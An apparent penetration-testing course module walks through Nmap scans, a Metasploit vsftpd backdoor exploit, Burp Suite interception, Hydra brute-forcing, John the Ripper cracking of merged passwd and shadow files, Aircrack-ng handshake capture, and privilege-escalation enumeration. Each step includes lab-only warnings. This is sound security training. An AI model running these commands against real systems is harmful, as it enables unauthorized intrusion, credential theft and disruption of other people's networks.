01

Nmap deep dive

Nmap ("Network Mapper") is the tool nearly every engagement starts with. It answers three questions about a target: which hosts are alive, which ports are open, and what's running on them. The beginner track covered a basic scan — here you'll learn the flags that make Nmap genuinely useful.

Scan types

bash
$ sudo nmap -sS 10.0.10.20        # SYN ("half-open") scan — fast, stealthier, needs root
$ nmap -sT 10.0.10.20             # full TCP connect scan — no root required
$ sudo nmap -sU 10.0.10.20        # UDP scan — slower, catches DNS/SNMP/etc.
$ nmap -sV 10.0.10.20             # probe open ports for service/version info
$ sudo nmap -O 10.0.10.20         # attempt OS fingerprinting

A practical all-in-one scan

bash
$ sudo nmap -A -T4 -p- -oN full-scan.txt 10.0.10.20
  • -A enables OS detection, version detection, script scanning, and traceroute
  • -T4 sets an "aggressive" timing template — faster, still generally safe on a stable lab network
  • -p- scans all 65,535 ports instead of the default top 1000
  • -oN full-scan.txt saves readable output to a file for your notes

Nmap Scripting Engine (NSE)

  • --script=default runs a safe, general-purpose script set alongside the scan
  • --script=vuln checks for known vulnerabilities matching detected service versions
  • --script=http-title,http-headers runs specific named scripts

Loud scans get noticed-A -T4 -p- is comprehensive but noisy — it will trip IDS/IPS alerts on any monitored network. Only run it against your own lab targets, and use gentler timing (-T2) when stealth actually matters for a legitimate authorized engagement.

02

Metasploit basics

The Metasploit Framework is a library of known exploits, payloads, and auxiliary modules wrapped in a consistent interface (msfconsole), so you don't need custom code for every publicly known vulnerability. It's the single most-used exploitation framework in the industry.

Framework building blocks

  • Exploit — code that takes advantage of a specific vulnerability
  • Payload — the code that runs once the exploit succeeds (e.g. a reverse shell)
  • Auxiliary — modules for scanning, fuzzing, and other non-exploit tasks
  • Encoder / NOP generator — helpers used mainly in evasion and exploit-dev work

A standard workflow against a lab target

msfconsole
msf6 > search type:exploit vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 > show options
msf6 > set RHOSTS 10.0.10.20
msf6 > set LHOST 10.0.10.10
msf6 > run

That specific module targets an intentionally backdoored FTP service shipped in the Metasploitable practice VM — it's a textbook first exploit precisely because the target was built for learning.

Payload generation with msfvenom

  • msfvenom -l payloads lists available payloads
  • Payloads are typically named by target + connection style, e.g. windows/x64/meterpreter/reverse_tcp
  • You'll build a payload hands-on in the Advanced track's custom payload module

Real exploits, lab onlyMetasploit modules are functioning exploits for real (usually patched) vulnerabilities. Run them only against VMs you built for this purpose — Metasploitable, DVWA, or a purpose-built VulnHub/HTB box.

03

Burp Suite basics

Burp Suite is an intercepting proxy — it sits between your browser and the web application, letting you see and edit every request before it's sent. It's the primary tool for manual web application testing, complementing automated scanners like Nmap's HTTP scripts.

Setting up the proxy

  • Launch Burp Suite (Community Edition ships with Kali) and confirm the proxy listener is on 127.0.0.1:8080
  • Point your browser's proxy settings at that address, or use a proxy-switcher extension like FoxyProxy
  • Visit http://burp in the proxied browser to download and install Burp's CA certificate, so HTTPS traffic can be inspected too

The tabs you'll use constantly

  • Proxy → Intercept — pause a request before it reaches the server so you can view or edit it
  • Repeater — resend a modified request as many times as you want, tweaking parameters each time
  • Intruder — automate sending many variations of a request (rate-limited in Community Edition), useful for testing input handling
  • Target — define scope so you only capture traffic to the application you're actually testing

A typical intercepted request

http
POST /login.php HTTP/1.1
Host: 10.0.10.20
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

username=admin&password=test

Once you can see a request like this, you can change the username or password value and forward it, or send it to Repeater to try different inputs without re-submitting the form each time.

Set scope carefullyAlways confirm Burp's scope is limited to your own lab app (DVWA, Juice Shop) before intercepting. Proxying and modifying traffic to any other site — even accidentally — can cross the same legal line covered in the beginner track.

04

Hydra password attacks

Hydra is an online brute-force tool — it tries username/password combinations directly against a live login service (SSH, FTP, a web login form, etc.) rather than against a stolen hash. It's fast to learn and a good introduction to why weak, reused passwords are still the top real-world entry point.

Basic syntax

bash
$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.10.20
$ hydra -L users.txt -P passwords.txt ftp://10.0.10.20
$ hydra -l admin -P rockyou.txt 10.0.10.20 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid"
  • -l a single username, -L a file of usernames
  • -P a wordlist of passwords to try; rockyou.txt is a well-known list bundled with Kali under /usr/share/wordlists/
  • The last argument is the protocol and target — ssh://, ftp://, rdp://, or http-post-form with a template describing the login form

Loud and disruptive by designBrute forcing generates huge volumes of failed logins, can lock real accounts, and is one of the easiest attacks to detect. Practice against a login you configured yourself, with a deliberately weak password, on an isolated target.

05

John the Ripper

Where Hydra attacks a live login, John the Ripper cracks password hashes you already have — for example, from a file you were authorized to extract during a lab exercise. This is "offline" cracking: no more login attempts hit the target, so it's limited only by your own hardware.

A typical workflow

bash
$ unshadow passwd.txt shadow.txt > combined.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt
$ john --show combined.txt
  • unshadow merges Linux's /etc/passwd and /etc/shadow into one file John can read
  • --wordlist runs a dictionary attack; omit it and John defaults to a slower rule-based mode
  • --show prints any hashes John has already cracked from its session file

Recognizing hash types

  • john --list=formats shows every hash format John understands
  • Common formats you'll encounter: MD5, SHA-256, NTLM (Windows), and bcrypt
  • Hashcat (also included in Kali) is John's GPU-accelerated cousin — worth learning once you're comfortable here

Wireless attacks overview

Wireless testing works differently from wired network attacks — you need a wireless adapter that supports "monitor mode" (most laptop built-in cards and many VM USB passthroughs don't), and you can only legally test networks you own or have written authorization for, since wireless attacks affect real radio spectrum, not just a target machine.

The Aircrack-ng suite

bash
$ sudo airmon-ng start wlan0        # switch the adapter into monitor mode
$ sudo airodump-ng wlan0mon         # list nearby networks and connected clients
$ sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
  • airmon-ng — enables/disables monitor mode on your wireless adapter
  • airodump-ng — passively captures beacon frames and, for WPA/WPA2, the four-way authentication handshake
  • aireplay-ng — can send deauthentication frames to a client to speed up handshake capture on a network you control
  • aircrack-ng — attempts to recover the passphrase from a captured handshake using a wordlist, the same dictionary-attack idea as Hydra and John

Your own router, nothing elseDeauthenticating clients and capturing handshakes on a network you don't own is illegal essentially everywhere and affects everyone connected to it, not just you. Practice on a spare router or a dedicated wireless testing lab you built and own.

07

Privilege escalation basics

Gaining initial access rarely means gaining full control. Privilege escalation is the process of turning a low-privilege foothold (a regular user shell) into administrator or root access — and it's usually the difference between "found a bug" and "fully compromised the box."

Linux enumeration commands

bash
$ sudo -l                                   # what can this user run as root?
$ find / -perm -4000 -type f 2>/dev/null    # SUID binaries — sometimes exploitable
$ uname -a                                  # kernel version — check for known privesc CVEs
$ crontab -l                                # scheduled jobs that might run as root

What you're looking for

  • Misconfigured sudo permissions that let a low-privilege user run something powerful as root
  • SUID binaries that can be abused to spawn a root shell (GTFOBins is the standard reference for which ones)
  • Outdated kernels vulnerable to a known local-privilege-escalation exploit
  • Cron jobs or services running as root that a regular user can modify

On Windows targets

  • whoami /priv — lists the current user's privileges
  • systeminfo — patch level and OS build, useful for matching known exploits
  • Automated enumeration scripts like LinPEAS (Linux) and WinPEAS (Windows) are commonly used to speed this process up — you'll use one in the Advanced post-exploitation module
